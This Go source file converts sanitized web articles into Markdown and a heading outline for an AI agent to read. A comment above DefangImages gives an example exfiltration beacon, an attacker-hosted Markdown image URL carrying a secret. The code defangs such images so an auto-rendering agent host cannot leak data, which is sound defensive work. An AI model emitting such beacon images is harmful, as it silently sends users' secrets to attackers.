// Package emit serializes reduced content into the representation an AI agent
// consumes. For v1 that is Markdown produced from the sanitized article HTML,
// plus a compact outline for orientation.
package emit

import (
	"fmt"
	"regexp"
	"strings"

	"github.com/JohannesKaufmann/html-to-markdown/v2/converter"
	"github.com/JohannesKaufmann/html-to-markdown/v2/plugin/base"
	"github.com/JohannesKaufmann/html-to-markdown/v2/plugin/commonmark"

	"github.com/christopherdavenport/unblink/internal/page"
)

// mdConverter is built once and shared — the same plugin set the v2
// ConvertString convenience wrapper constructs per call. A Converter is
// documented safe for concurrent use (internally mutex-guarded); per-call
// options like WithDomain are passed to ConvertString, not baked in here.
var mdConverter = converter.NewConverter(
	converter.WithPlugins(base.NewBasePlugin(), commonmark.NewCommonmarkPlugin()),
)

// mdImage matches a Markdown inline image: ![alt](url) with an optional title.
var mdImage = regexp.MustCompile(`!\[([^\]]*)\]\(\s*([^)]*?)\s*\)`)

// DefangImages rewrites Markdown image syntax into inert text. An agent host that
// auto-renders Markdown will fetch an image URL on render, so an attacker-controlled
// image (![](https://attacker/log?d=SECRET)) is a zero-click data-exfiltration
// beacon. Converting images to plain text ([image: alt — url]) removes the auto-load
// while preserving the alt text and URL for the model. Ordinary links are untouched.
func DefangImages(md string) string {
	return mdImage.ReplaceAllStringFunc(md, func(m string) string {
		sub := mdImage.FindStringSubmatch(m)
		alt := strings.TrimSpace(sub[1])
		url := strings.TrimSpace(sub[2])
		if i := strings.IndexAny(url, " \t"); i >= 0 { // drop a trailing "title"
			url = strings.TrimSpace(url[:i])
		}
		switch {
		case alt != "" && url != "":
			return "[image: " + alt + " — " + url + "]"
		case url != "":
			return "[image: " + url + "]"
		case alt != "":
			return "[image: " + alt + "]"
		default:
			return "[image]"
		}
	})
}

// Markdown converts p.Article's sanitized content to Markdown and stores it in
// p.Markdown. The article title, when present, is prepended as a top-level
// heading. The page origin is passed as a base domain so any still-relative
// links resolve to absolute URLs.
func Markdown(p *page.Page) error {
	if p.Article == nil {
		return fmt.Errorf("emit: page has no reduced article")
	}

	var opts []converter.ConvertOptionFunc
	if p.FinalURL != nil && p.FinalURL.Host != "" {
		opts = append(opts, converter.WithDomain(p.FinalURL.Scheme+"://"+p.FinalURL.Host))
	}

	body, err := mdConverter.ConvertString(p.Article.ContentHTML, opts...)
	if err != nil {
		return fmt.Errorf("emit: convert to markdown: %w", err)
	}
	body = strings.TrimSpace(body)

	var b strings.Builder
	if title := strings.TrimSpace(p.Article.Title); title != "" {
		b.WriteString("# ")
		b.WriteString(title)
		b.WriteString("\n\n")
	}
	b.WriteString(body)
	b.WriteString("\n")
	p.Markdown = b.String()
	return nil
}

// Outline renders a compact table of contents from p.Meta.Headings, indented by
// heading depth relative to the shallowest heading on the page.
func Outline(p *page.Page) string {
	if len(p.Meta.Headings) == 0 {
		return ""
	}
	minLevel := 6
	for _, h := range p.Meta.Headings {
		if h.Level < minLevel {
			minLevel = h.Level
		}
	}
	var b strings.Builder
	for _, h := range p.Meta.Headings {
		text := strings.TrimSpace(h.Text)
		if text == "" {
			continue
		}
		indent := strings.Repeat("  ", h.Level-minLevel)
		b.WriteString(indent)
		b.WriteString("- ")
		b.WriteString(text)
		b.WriteByte('\n')
	}
	return b.String()
}
